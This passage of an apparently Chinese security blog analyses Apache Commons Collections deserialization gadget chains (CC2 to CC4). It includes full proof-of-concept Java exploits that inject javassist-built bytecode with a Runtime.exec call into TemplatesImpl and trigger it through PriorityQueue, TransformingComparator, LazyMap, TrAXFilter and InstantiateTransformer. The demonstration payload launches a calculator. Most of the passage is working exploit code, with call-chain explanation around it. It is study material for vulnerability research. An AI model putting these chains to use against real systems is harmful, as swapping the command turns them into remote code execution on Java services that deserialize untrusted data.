class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        size.set(queue,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field comparator_field = Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        comparator_field.set(queue,Tcomparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc2.bin&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc2.bin&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TemplatesImpl-类生成"><a href="#TemplatesImpl-类生成" class="headerlink" title="TemplatesImpl 类生成"></a>TemplatesImpl 类生成</h3><p>我们先来看一看TemplatesImpl  是如何进行类生成的。</p><p>首先TemplatesImpl类中有个方法defineTransletClasses，它的主要代码如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[][] _bytecodes = (<span class="keyword">byte</span>[][])<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>._bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        .....</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> classCount = <span class="keyword">this</span>._bytecodes.length;</span><br><span class="line">                <span class="keyword">this</span>._class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; ++i) &#123;</span><br><span class="line">                    <span class="keyword">this</span>._class[i] = loader.defineClass(<span class="keyword">this</span>._bytecodes[i]);  \\将_bytecodes中的所有字节通过defineClass转化为一个类</span><br><span class="line">                    Class superClass = <span class="keyword">this</span>._class[i].getSuperclass();</span><br><span class="line">                    <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                        <span class="keyword">this</span>._transletIndex = i;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">this</span>._auxClasses.put(<span class="keyword">this</span>._class[i].getName(), <span class="keyword">this</span>._class[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>也就是说通过这个方法可以将_bytecodes数组中的字节还原成一个类，存储到_class变量中。接下来如果我们能找到调用defineTransletClasses方法并执行了_class[].newinstance() 这样的的代码的方法，就能实例化从字节得到的类了，从而就能执行类中的静态代码块和构造函数了！<br />所以接下来我们需要去寻找这种方法。<br />通过搜索defineTransletClasses，我们找到了有如下三个方法调用了defineTransletClasses方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getTransletInstancegetTransletIndexgetTransletClasses</span><br></pre></td></tr></table></figure><p>其中，getTransletInstance方法是唯一符合“调用了defineTransletClasses且有_class[].newinstance()”的方法，其代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private Translet getTransletInstance() throws TransformerConfigurationException &#123;</span><br><span class="line">        ErrorMsg err;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (this._name &#x3D;&#x3D; null) &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (this._class &#x3D;&#x3D; null) &#123;</span><br><span class="line">                    this.defineTransletClasses();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                AbstractTranslet translet &#x3D; (AbstractTranslet)this._class[this._transletIndex].newInstance(); \\here,注意此处生成的类对象应该是AbstractTranslet或其子类</span><br><span class="line">                translet.postInitialization();</span><br><span class="line">                translet.setTemplates(this);</span><br><span class="line">                translet.setServicesMechnism(this._useServicesMechanism);</span><br><span class="line">                if (this._auxClasses !&#x3D; null) &#123;</span><br><span class="line">                    translet.setAuxiliaryClasses(this._auxClasses);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                return translet;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>那么，getTransletInstance是一个private方法，我们不能直接调用它，在那里能去调用它呢？答案是newTransformer方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public synchronized Transformer newTransformer() throws TransformerConfigurationException &#123;</span><br><span class="line">    TransformerImpl transformer &#x3D; new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory);  \\here</span><br><span class="line">········</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说我们可以通过javassist动态控制_bytecodes属性的值，然后通过InvokerTransfomer调用TemplatesImpl.newTransfomer来把我们通过javassist得到的字节码实例化，在实例化的时候调用其构造函数。</p><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor constructor = Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">TransformingComparator Tcomparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里是先获取InvokerTransformer的构造方法，然后向构造方法传入newTransformer来实例化一个InvokerTransformer方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">CtClass cc = pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">String randomClassName = <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">cc.setName(randomClassName);</span><br><span class="line"><span class="comment">//cc.writeFile();</span></span><br><span class="line">cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"><span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line"><span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"></span><br><span class="line">TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;blckder02&quot;</span>);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p>这里是通过javassist动态实现了一个构造函数为执行计算器的类，将其转化为字节码保存，然后在实例化TemplatesImpl时传入其_bytecodes变量，这里还必须为_name赋值，_class我测试的时候也不用赋值，但是加上最好？我没有细跟。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object[] queue_array = <span class="keyword">new</span> Object[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">Field queue_field = Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queue_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">Field size = Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">size.set(queue,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Field comparator_field = Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">comparator_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">comparator_field.set(queue,Tcomparator);</span><br></pre></td></tr></table></figure><p>然后通过反射向queue数组赋值，一个值为刚刚生成的TemplatesImpl对象，另一个值随意，总之这里得传入2个以上的值。<br>然后通过反射向size赋值，再然后通过反射向comparator赋值。<br>赋值完成后进行序列化操作。</p><h1 id="Apache-Commons-Collections-3"><a href="#Apache-Commons-Collections-3" class="headerlink" title="Apache-Commons-Collections 3"></a>Apache-Commons-Collections 3</h1><p>CC3链大致上是CC1和CC2的缝合，中间一些细节有点不同（TrAXFilter，InstantiateTransformer）</p><p>LazyMap+TrAXFilter+InstantiateTransformer+TemplatesImpl</p><h2 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h2><p>commons-collections-3.1-3.2.1，JDK1.7</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                            newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         newInstance()</span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open  /System/Applications/Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="comment">//设置父类为AbstractTranslet，避免报错</span></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);</span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,map_handler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor AnnotationInvocationHandler_Constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc3&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc3&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现是ChianedTransformer+TemplatesImpl+LazyMap 缝合，不过ChianedTransformer内部有点和CC链1、2不同.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">          <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">          <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>我们可以发现是通过InstantiateTransformer 替代了InvokerTransformer，并且用到了TrAXFilter.class 这个类。</p><p>我们来分析一下这两个贵物。</p><h3 id="TrAXFilter-class"><a href="#TrAXFilter-class" class="headerlink" title="TrAXFilter.class"></a>TrAXFilter.class</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image.png"></p><p>十分明显，TrAXFilter的构造方法对传入的Templates对象进行了实例化处理，而TemplatesImpl是Templates的子类，于是乎我们可以传入一个TemplatesImpl对象，使该对象的newTransformer方法被调用，以此促成TemplatesImpl对象中_bytecodes中的字节码被实例化成一个恶意对象，并调用这个恶意对象的构造方法。</p><h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_1.png"></p><p>可以发现transformer方法中会获取传入对象的构造方法，并传入参数调用其构造方法。<br>我们这个地方传入TrAXFilter对象，并传入恶意的TemplatesImpl对象便可以在TrAXFilter调用构造方法时调用TemplatesImpl.newInstance 把恶意对象从字节码生成出来并调用恶意对象的构造方法。</p><h1 id="Apache-Commons-Collections-4"><a href="#Apache-Commons-Collections-4" class="headerlink" title="Apache-Commons-Collections 4"></a>Apache-Commons-Collections 4</h1><p>CC2,3的缝合，细节上有些许差别.</p><p>PriorityQueue+TrAXFilter+InstantiateTransformer+TemplatesImpl</p><h2 id="版本-2"><a href="#版本-2" class="headerlink" title="版本"></a>版本</h2><p>CommonsCollections 4.0，JDK暂无限制，需javassist依赖</p><h2 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                            newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         newInstance()</span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="comment">//设置父类为AbstractTranslet，避免报错</span></span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        <span class="comment">// 进入 defineTransletClasses() 方法需要的条件</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * TrAXFilter 构造函数能直接触发 所以不用利用 invoke 那个</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field comparator_field = Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        comparator_field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc4&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc4&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span 